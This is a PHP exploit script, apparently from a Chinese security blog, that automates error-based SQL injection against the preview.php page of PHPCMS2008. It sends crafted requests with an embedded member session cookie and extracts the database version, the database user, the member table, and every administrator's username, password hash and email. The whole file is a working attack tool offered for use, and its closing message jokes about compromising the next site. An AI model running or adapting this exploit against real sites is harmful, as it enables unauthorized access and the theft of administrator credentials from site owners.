<?php
/**
 * Created by 独自等待
 * Date: 13-11-24
 * Time: 下午8:36
 * Name: phpcms2008_preview.php
 * 独自等待博客：http://www.waitalone.cn/
 */
print_r('
+------------------------------------------------------+
             PHPCMS2008 preview.php 注入EXP
             Site：http://www.waitalone.cn/
                Exploit BY： 独自等待
                  Time：2013-11-24
+------------------------------------------------------+
');
if ($argc < 3) {
    print_r('
+------------------------------------------------------+
Useage: php ' . $argv[0] . ' host path
Host: target server (ip/hostname)
Path: path of phpcms
Example: php ' . $argv[0] . ' localhost /phpcms
+------------------------------------------------------+
    ');
    exit;
}
error_reporting(7);
//统计时间
$start_time = func_time();
$host = $argv[1];
$path = $argv[2];
$cookie = 'PHPSESSID=paie8nva343mi2ivjfl8pemqq3; vsLCNPLglFauth=56c8VgQGVgkJAggBU10HDwVSDVQAVFsBUFEBXQIOAGpSDAJQAwcFDw9TXVcGWQUKBAFbVFsHDlMHBVQBAglWAQ; vsLCNPLglFcookietime=86400; vsLCNPLglFusername=testtest; vsLCNPLglFattachments[1114]=2014%2F1202%2F20141202030305840.jpg; vsLCNPLglFattachments[1116]=2014%2F1202%2F20141202031032159.jpg; vsLCNPLglFattachments[1117]=2014%2F1202%2F20141202031839261.jpg; vsLCNPLglFattachments[1118]=2014%2F1202%2F20141202032446660.jpg'; //请把会员cookie写入此变量中
if ($cookie == '') exit('请注册会员后写入cookie到cookie变量中。');
if (preg_match('/MySQL Query/i', send_pack("'"))) {
    //数据库版本
    $db_ver = "'and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#";
    echo '数据库版本：' . get_info($db_ver) . "\n";
    //数据库用户
    $db_user = "'and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#";
    echo '数据库用户：' . get_info($db_user) . "\n";
    //获取用户表
    $db_member = "' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() and table_name like '%_member%' LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#";
    $member = get_info($db_member);
    //获取管理员数量
    $db_count = "' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,count(*),0x7e) FROM $member where groupid=1 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#";
    $ad_count = get_info($db_count);
    echo '管理员表中共有--[' . $ad_count . ']--个管理员' . "\n";
    //显示注入数据
    foreach (range(0, ($ad_count - 1)) as $i) {
        $ad_pass = "' and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,username,0x3a,password,0x3a,email,0x7e) FROM $member where groupid=1 LIMIT $i,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#";
        echo '管理员[' . ($i + 1) . ']-->' . get_info($ad_pass) . "\n";
    }
} else {
    exit("报告大人，网站不存在此漏洞,你可以继续秒下一个!\n");
}
 
//提取返回信息
function get_info($info)
{
    preg_match('/~(.*?)~1/i', send_pack($info), $match_string);
    if (preg_match('/charset=utf-8/i', send_pack($info))) {
        return iconv('utf-8', 'gbk//IGNORE', $match_string[1]);
    } else {
        return $match_string[1];
    }
}
 
//发送数据包函数
function send_pack($cmd)
{
    global $host, $path, $cookie;
    $data = "GET " . $path . "/preview.php?info[catid]=15&content=a[page]b&info[contentid]=2" . urlencode($cmd) . " HTTP/1.1\r\n";
    $data .= "Host: " . $host . "\r\n";
    $data .= "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0\r\n";
    $data .= "Cookie:" . $cookie . "\r\n";
    $data .= "Connection: Close\r\n\r\n";
    //echo $data;
    //这里一定要2个\r\n否则将会一直等待并且不返回数据
    $fp = @fsockopen($host, 80, $errno, $errstr, 30);
    //echo ini_get('default_socket_timeout');//默认超时时间为60秒
    if (!$fp) {
        echo $errno . '-->' . $errstr;
        exit('Could not connect to: ' . $host);
    } else {
        fwrite($fp, $data);
        $back = '';
        while (!feof($fp)) {
            $back .= fread($fp, 1024);
        }
        fclose($fp);
    }
    return $back;
}
 
//时间统计函数
function func_time()
{
    list($microsec, $sec) = explode(' ', microtime());
    return $microsec + $sec;
}
 
echo '脚本执行时间：' . round((func_time() - $start_time), 4) . '秒。';
?>